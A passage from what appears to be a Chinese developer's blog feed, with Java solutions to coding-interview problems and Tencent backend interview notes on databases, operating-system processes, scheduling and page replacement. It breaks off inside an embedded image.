1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 123</span><br><span class="line">Output: 321</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: -123</span><br><span class="line">Output: -321</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 120</span><br><span class="line">Output: 21</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">reverse</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">prevRev</span> <span class="operator">=</span> <span class="number">0</span> , rev= <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x != <span class="number">0</span>)&#123;</span><br><span class="line">            rev= rev*<span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>((rev - x % <span class="number">10</span>) / <span class="number">10</span> != prevRev)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            prevRev = rev;</span><br><span class="line">            x= x/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> rev;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="implement-rand10-using-rand7">Implement Rand10() Using Rand7()</span></h2><p>Given a function <code>rand7</code> which generates a uniform random integer in the range 1 to 7, write a function <code>rand10</code> which generates a uniform random integer in the range 1 to 10.</p><p>Do NOT use system’s <code>Math.random()</code>.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1</span><br><span class="line">Output: [7]</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 2</span><br><span class="line">Output: [8,4]</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output: [8,1,10]</span><br></pre></td></tr></table></figure><p>Idea: <code>rand7()</code> -&gt; <code>rand49()</code> -&gt; <code>rand40()</code> -&gt; <code>rand10()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rand10</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">40</span>;</span><br><span class="line">    <span class="keyword">while</span> (result &gt;= <span class="number">40</span>) &#123;result = <span class="number">7</span> * (rand7() - <span class="number">1</span>) + (rand7() - <span class="number">1</span>);&#125;</span><br><span class="line">    <span class="keyword">return</span> result % <span class="number">10</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Summary:<br>I assume <code>rand7()</code> represents the number from <code>0</code> to <code>6</code> which is more general in Java, please refer <code>Random</code> class and <code>nextInt(int bound)</code>: <a href="https://docs.oracle.com/javase/8/docs/api/java/util/Random.html#nextInt-int-">knock API door</a></p><ol><li>Key is <code>uniform</code></li><li><code>rand7() * rand7()</code>, <code>rand7() + rand7()</code> are not uniform because some numbers can be generated by different combinations</li><li><code>rand7() + rand7() != rand7() * 2</code> because <code>rand7() + rand7()</code> is not uniform, whereas <code>rand7() * 2</code> is uniform</li><li><code>rand7()*c</code> is uniform where <code>c</code> stands for constant integers. (But note: uniform here is meant by <strong>discrete numbers</strong>, to make the range continuously, we need to fill the gap by adding <code>randc()</code> &#x3D;&gt; which then leads to OP solution)</li></ol><p>So pattern we can conclude: <code>k * randk + randk</code> is uniform.(Note for the 3rd rule, don’t mix it up with <code>(k + 1)*randk</code>)</p><p><strong>其实就是k^n(randk-1)+k^n-1(randk-1)+…+randk-1大于randM就行了</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;盘点了高频的面试题&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="https://disda-coding.github.io/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="Algorithm" scheme="https://disda-coding.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://disda-coding.github.io/2020/04/14/Tencent/"/>
    <id>https://disda-coding.github.io/2020/04/14/Tencent/</id>
    <published>2020-04-14T10:12:13.000Z</published>
    <updated>2023-03-30T01:45:09.552Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>腾讯后台面经</p><span id="more"></span><!-- toc --><ul><li><a href="#%E7%AE%97%E6%B3%95%E9%A2%98">算法题</a><ul><li><a href="#%E5%8E%8B%E7%BC%A9%E7%AE%97%E6%B3%95">压缩算法</a></li><li><a href="#%E6%AF%8Fk%E4%B8%AA%E8%8A%82%E7%82%B9%E7%BF%BB%E8%BD%AC%E9%93%BE%E8%A1%A8-">每K个节点翻转链表 -</a></li><li><a href="#%E6%9C%80%E9%95%BF%E4%B8%8D%E9%87%8D%E5%A4%8D%E5%AD%90%E4%B8%B2-">最长不重复子串 -</a></li></ul></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93">数据库</a><ul><li><a href="#mysql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84%E6%96%B9%E5%BC%8F">mysql主从复制的方式</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B8%B8%E8%A7%81%E6%AD%BB%E9%94%81%E5%8E%9F%E5%9B%A0%E5%8F%8A%E5%A4%84%E7%90%86">数据库常见死锁原因及处理</a></li></ul></li><li><a href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a><ul><li><a href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84fork%E6%93%8D%E4%BD%9C%E5%B8%A6%E6%9D%A5%E7%9A%84%E8%BF%9B%E7%A8%8B%E9%97%AE%E9%A2%98%E9%80%9A%E4%BF%A1%E9%97%AE%E9%A2%98">操作系统的fork操作，带来的进程问题，通信问题</a></li><li><a href="#%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E7%94%A8%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E7%94%A8%E5%A4%9A%E8%BF%9B%E7%A8%8B">什么时候用多线程，什么时候用多进程 √</a></li><li><a href="#%E7%BA%BF%E7%A8%8B%E5%88%87%E6%8D%A2%E5%92%8C%E8%BF%9B%E7%A8%8B%E5%88%87%E6%8D%A2%E7%9A%84%E6%AF%94%E8%BE%83">线程切换和进程切换的比较</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%88%87%E6%8D%A2%E5%BE%88%E6%85%A2">为什么虚拟地址切换很慢？</a></li><li><a href="#%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B">孤儿进程和僵尸进程 √</a></li><li><a href="#%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E6%96%B9%E6%B3%95%E8%AF%A6%E7%BB%86%E4%BB%8B%E7%BB%8D">进程调度方法详细介绍 √</a></li><li><a href="#%E9%A1%B5%E9%9D%A2%E7%BD%AE%E6%8D%A2%E6%96%B9%E6%B3%95%E8%AF%A6%E7%BB%86%E4%BB%8B%E7%BB%8D">页面置换方法详细介绍 √</a></li><li><a href="#%E6%AD%BB%E9%94%81">死锁</a></li></ul></li><li><a href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C">计算机网络</a><ul><li><a href="#tcpip%E4%B8%AD%E7%9A%84%E6%94%BB%E5%87%BB">TCP&#x2F;IP中的攻击</a></li><li><a href="#http10%E5%92%8Chttp11%E7%9A%84%E4%B8%BB%E8%A6%81%E5%8C%BA%E5%88%AB">Http1.0和Http1.1的主要区别 √</a></li><li><a href="#http11%E4%B8%8Ehttp-20%E7%9A%84%E4%B8%BB%E8%A6%81%E5%8C%BA%E5%88%AB-">http1.1与http 2.0的主要区别 -</a></li><li><a href="#rtt%E5%92%8Crto">RTT和RTO √</a></li><li><a href="#%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6">拥塞控制</a></li><li><a href="#%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6">流量控制</a></li><li><a href="#tcp%E5%A6%82%E4%BD%95%E6%8F%90%E4%BE%9B%E5%8F%AF%E9%9D%A0%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93">TCP如何提供可靠数据传输</a></li><li><a href="#%E5%A6%82%E4%BD%95%E5%8C%BA%E5%88%86%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6%E5%92%8C%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6">如何区分流量控制和拥塞控制？</a></li><li><a href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-1">操作系统</a></li><li><a href="#select-epoll-poll">select epoll poll</a></li><li><a href="#http-keep-alive%E4%B8%8Etcp-keep-alive">http keep-alive与tcp keep-alive</a></li><li><a href="#redis%E5%AE%9E%E4%B9%A0%E7%BC%93%E5%AD%98%E5%90%8C%E6%AD%A5">Redis实习缓存同步</a></li></ul></li><li><a href="#%E5%AE%9E%E9%99%85%E9%97%AE%E9%A2%98">实际问题</a><ul><li><a href="#%E6%80%8E%E4%B9%88%E8%A7%A3%E5%86%B3bug%E9%97%AE%E9%A2%98%E6%9C%89%E7%94%A8%E6%97%A5%E5%BF%97%E5%90%97">怎么解决bug问题，有用日志吗？</a></li></ul></li><li><a href="#%E5%85%B6%E4%BB%96">其他</a><ul><li><a href="#%E5%93%88%E5%B8%8C%E5%86%B2%E7%AA%81%E6%B3%95">哈希冲突法</a></li></ul></li></ul><!-- tocstop --><h1><span id="算法题">算法题</span></h1><h2><span id="压缩算法">压缩算法</span></h2><p>小Q想要给他的朋友发送一个神秘字符串，但是他发现字符串的过于长了，于是小Q发明了一种压缩算法对字符串中重复的部分进行了压缩，对于字符串中连续的m个相同字符串S将会压缩为<a href="m%E4%B8%BA%E4%B8%80%E4%B8%AA%E6%95%B4%E6%95%B0%E4%B8%941%3C=m%3C=100">m|S</a>，例如字符串ABCABCABC将会被压缩为[3|ABC]，现在小Q的同学收到了小Q发送过来的字符串，你能帮助他进行解压缩么？ </p><p> <strong>输入描述:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入第一行包含一个字符串s，代表压缩后的字符串。</span><br><span class="line">S的长度&lt;=1000;</span><br><span class="line">S仅包含大写字母、[、]、|;</span><br><span class="line">解压后的字符串长度不超过100000;</span><br><span class="line">压缩递归层数不超过10层;</span><br></pre></td></tr></table></figure><p>输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HG[3|B[2|CA]]F</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HGBCACABCACABCACAF</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">decode</span><span class="params">(String a)</span>&#123;</span><br><span class="line">        <span class="type">char</span>[] c = a.toCharArray();</span><br><span class="line">        Stack&lt;String&gt; rec =<span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">        Stack&lt;Integer&gt; mul=<span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">        <span class="type">int</span> multi=<span class="number">0</span>;        </span><br><span class="line">        StringBuilder tmp= <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;c.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c[i]==<span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">                rec.push(tmp.toString());</span><br><span class="line">                tmp=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c[i]==<span class="string">&#x27;]&#x27;</span>)&#123;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="type">int</span> loop=mul.pop();</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;loop;j++)&#123;</span><br><span class="line">                    temp.append(tmp);</span><br><span class="line">                &#125;</span><br><span class="line">                tmp=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(rec.pop()+temp);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c[i]==<span class="string">&#x27;|&#x27;</span>)&#123;</span><br><span class="line">                mul.push(multi);</span><br><span class="line">                multi=<span class="number">0</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c[i]&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;c[i]&lt;=<span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line">                multi=multi*<span class="number">10</span>+c[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                tmp.append(c[i]+<span class="string">&quot;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tmp.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> sc.next();</span><br><span class="line">        sc.close();        </span><br><span class="line">        System.out.println(decode(a));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="每k个节点翻转链表-">每K个节点翻转链表 -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverseKGroup</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> calLen(head,<span class="number">0</span>);</span><br><span class="line">        ListNode dummy=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummy.next=head;</span><br><span class="line">        <span class="type">int</span> cyc=len/k;</span><br><span class="line">        ListNode pre=dummy,l1=head,l2=head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;cyc;i++)&#123;            </span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;k;j++)&#123;</span><br><span class="line">                l2=l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            ListNode next=l2.next;</span><br><span class="line">            l2.next=<span class="literal">null</span>;</span><br><span class="line">            ListNode tmp=l1;</span><br><span class="line">            reverse(l1);</span><br><span class="line">            pre.next=l2;</span><br><span class="line">            tmp.next=next;</span><br><span class="line">            pre=tmp;</span><br><span class="line">            l1=next;</span><br><span class="line">            l2=next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">calLen</span><span class="params">(ListNode head,<span class="type">int</span> res)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">        <span class="keyword">return</span> calLen(head.next,res+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(ListNode root)</span>&#123;</span><br><span class="line">        ListNode head=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span>(root!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.next;</span><br><span class="line">            root.next=head.next;</span><br><span class="line">            head.next=root;</span><br><span class="line">            root=tmp;</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="最长不重复子串-">最长不重复子串 -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        HashMap&lt;Character,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,res=<span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span>[] c=s.toCharArray();</span><br><span class="line">        <span class="keyword">while</span>(i&lt;s.length())&#123;</span><br><span class="line">          <span class="keyword">if</span>(map.containsKey(c[i]))&#123;</span><br><span class="line">              j=Math.max(j,map.get(c[i])+<span class="number">1</span>);              </span><br><span class="line">          &#125;</span><br><span class="line">            map.put(c[i],i);</span><br><span class="line">            res=Math.max(res,i-j+<span class="number">1</span>);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="数据库">数据库</span></h1><h2><span id="mysql主从复制的方式">mysql主从复制的方式</span></h2><ul><li>基于 SQL 语句的复制(statement-based replication, SBR)；</li><li>基于行的复制(row-based replication, RBR)；</li><li>混合模式复制(mixed-based replication, MBR)；</li></ul><h2><span id="数据库常见死锁原因及处理">数据库常见死锁原因及处理</span></h2><p><strong>一. 事务之间对资源访问顺序的交替</strong></p><ol><li>出现原因：<br>一个用户A 访问表A（锁住了表A），然后又访问表B；另一个用户B 访问表B（锁住了表B），然后企图访问表A；这时用户A由于用户B已经锁住表B，它必须等待用户B释放表B才能继续，同样用户B要等用户A释放表A才能继续，这就死锁就产生了。</li><li>解决方法：<br>这种死锁比较常见，是由于程序的BUG产生的，除了调整的程序的逻辑没有其它的办法。仔细分析程序的逻辑，对于数据库的多表操作时，尽量按照相同的顺序进行处理，尽量避免同时锁定两个资源，如操作A和B两张表时，总是按先A后B的顺序处理， 必须同时锁定两个资源时，要保证在任何时刻都应该按照相同的顺序来锁定资源。</li></ol><p>1）以固定的顺序访问表和行。即按顺序申请锁，这样就不会造成互相等待的场面。</p><p>2）大事务拆小。大事务更倾向于死锁，如果业务允许，将大事务拆小。</p><p>3）在同一个事务中，尽可能做到一次锁定所需要的所有资源，减少死锁概率。</p><p>4）降低隔离级别。如果业务允许，将隔离级别调低也是较好的选择，比如将隔离级别从RR调整为RC，可以避免掉很多因为gap锁造成的死锁。</p><p>5）为表添加合理的索引。如果不走索引将会为表的每一行记录添加上锁，死锁的概率大大增大。</p><h1><span id="操作系统">操作系统</span></h1><h2><span id="操作系统的fork操作带来的进程问题通信问题">操作系统的fork操作，带来的进程问题，通信问题</span></h2><ul><li>fork（）函数通过系统调用创建一个与原来进程几乎完全相同的进程，也就是两个进程可以做完全相同的事，但如果初始参数或者传入的变量不同，两个进程也可以做不同的事。</li></ul><h2><span id="什么时候用多线程什么时候用多进程">什么时候用多线程，什么时候用多进程 √</span></h2><p>多进程——计算密集型：大量消耗CPU的数学与逻辑运算，也就是我们这里说的平行计算。</p><p>多线程——IO密集型：读取文件，读取网络套接字频繁。</p><h2><span id="线程切换和进程切换的比较">线程切换和进程切换的比较</span></h2><p>线程切换 与 进程切换的比较。进程切换分为两步：</p><p><strong>1）切换虚拟地址</strong></p><p><strong>2）切换内核栈和硬件上下文</strong>。</p><p>线程只有一步：<strong>切换内核栈和硬件上下文</strong>。  </p><p><strong>切换页目录的开销很大。</strong> </p><h2><span id="为什么虚拟地址切换很慢">为什么虚拟地址切换很慢？</span></h2><p>每个进程都有自己的虚拟地址空间，每个进程都有自己的页表。 切换进程后，页表也要进行切换，TLB就失效了（页表缓冲），cache失效导致命中率降低，虚拟地址转换为物理地址就会很慢。</p><h2><span id="孤儿进程和僵尸进程">孤儿进程和僵尸进程 √</span></h2><p>一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。</p><p>即子进程先于父进程退出后，子进程的PCB需要其父进程释放（调用wait或者waitpid），但是父进程并没有释放子进程的PCB，这样的子进程就称为僵尸进程，僵尸进程实际上是一个已经死掉的进程。</p><h2><span id="进程调度方法详细介绍">进程调度方法详细介绍 √</span></h2><p>1）程序任务有三种:CPU计算密集型、IO密集型与平衡型。2）调度算法：（1） 先来先去服务算法：其优点就是简单且实现容易，缺点则是短的工作有可能变得很慢，因为其前面有很长的工作在执行，这样就会造成用户的交互式体验也比较差。<br>（2）时间片轮转算法：　时间片轮转是对FCFS算法的一种改进，其主要目的是改善短程序的响应时间，实现方式就是周期性地进行进程切换。时间片轮转的重点在<strong>于时间片的选择</strong>，需要考虑多方因素：如果运行的进程多时，时间片就需要短一些；进程数量少时，时间片就可以适当长一些。<br>（3）短任务优先：短任务的优先级比长任务的高，而我们总是安排优先级高的任务先运行。①抢占式：抢占式则是<strong>每增加一个新的进程就需要对所有进程（包括正在CPU上运行的进程）进行检查</strong>，谁的时间短就运行谁。②非抢占式：非抢占式当已经在CPU上运行的任务结束或阻塞时，从候选任务中选择执行时间最短的进程来执行优点：系统平均响应时间在以上几种算法中是最优的缺点：一是可能造成长任务无法得到CPU时间从而导致“肌饿”。二是如何知道每个进程还需要运转多久？<br>（4）优先级调度算法：优先级调度算法给每个进程赋予一个优先级，每次需要进程切换时，找一个优先级最高的进程进行调度。优点在于可以赋予重要的进程以高优先级以确保重要任务能够得到CPU时间，其缺点则有二：一是低优先级的进程可能会“饥饿”，二是响应时间无法保证。<br>（5）混合调度算法：将所有进程分为不同的大类，每个大类为一个优先级。如果两个进程处于不同的大类，则处于高优先级大类的进程优先执行；如果处于同一个大类，则采用时间片轮转算法来执行。</p><h2><span id="页面置换方法详细介绍">页面置换方法详细介绍 √</span></h2><p>页帧：分页式内存管理将物理内存分为等大的小块。</p><p>页：逻辑内存（使用虚拟内存技术扩大的内存，可认为其位于硬盘上），也被分为了等大的小块，称为页。（且页和页帧的大小一定是一样的，它是<strong>写入真实内存</strong>和<strong>写回硬盘最小单位</strong>。）页面置换算法：页帧被写满，但需要用新的页。需要进行置换。</p><p><strong>2.1 Optimal算法（最优算法）</strong>　　首先介绍最优算法，它需要知道以后要被用到的页，然后将不会被用到的页换出内存；如果所有页都会被用到，就把需要使用时间离现在最长的页换出，以尽量使不好的情况晚发生。（不可能实现）</p><p><strong>2.2 FIFO（First-In First-Out，先进先出）算法</strong>　　FIFO算法的思想很简单，就是置换出当前已经待在内存里时间最长的那个页。FIFO算法的运行速度很快，不需要考虑其他的因素，需要的开销很少。</p><p><strong>2.3 Second Chance（第二次机会）算法</strong>　　为了避免FIFO算法将重要的页换出内存，Second Chance算法提供了一些改进。Second Chance算法在将页面换出内存前检查其使用位（使用位前文有介绍），如果其使用位为1，证明此页最近有被使用，猜测它还可能被使用，于是不把它置换出内存，但是把其使用位置为0，随后检查下一个页面，直到发现某页的使用位为0，将此页置换出内存。</p><p><strong>2.4 Clock算法（时钟轮转法）</strong>　　<strong>为了节约Second Chance算法一个接着一个检查使用位的开销</strong>，时钟轮转法又提出了改进。时钟轮转法将所有的页组成一个圆，圆心的指针指向下一个要被置换的页面，置换前同样检查使用位，如果使用位为1，同样将其使用位置为0，随后将顺指针旋转，检查下一个页面，直到发现某页的使用位为0，将此页置换出内存。很容易理解此算法为什么叫“时钟”轮转法。<img src="/2020/04/14/Tencent/Image.png" alt="img"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAkYAAAG5CAYAAABr8fs9AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAMpESURBVHhe7d139H5VlR/+JP8ka2UyTpJxYolJdCyJZcQuIIgI0uwCCtL5Ik2qVJEuICBSRHoRBAREEOmCKDKMomJBEQdFUZGZscQymcmMmeT+fq8zn42Xy1Pu0z6fp+z3Wmd9ynOfW849Z+/32e38iyqRSCQSiUQiUZDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSicSy4v/9v/9X2rgxqfMmEonFQhKjRCKxrEhilEgkphlJjBKJRCKRSCSWkMQokUgkEolEYglJjBKJRCKRSCSWkMQokUgkEolEYglJjBKJxFQjg6oTicRyIolRIpGYaiQxSiQSy4kkRolEYqbQligloUokEsMgiVEikZgpJDFKJBKTRBKjRCIxU0jCk0gkJokkRolEYsXxf//v/63+8R//sTS/90ISo0QiMUkkMUokEisKJAch+uUvf1n9z//5P8vviUQisVJIYpRIJIYG687vfve76n//7/9d/e3f/m3161//uhCcn//859Vf//VfV4888kj18MMPVz/+8Y+rH/7wh9UPfvCD6sEHH3xM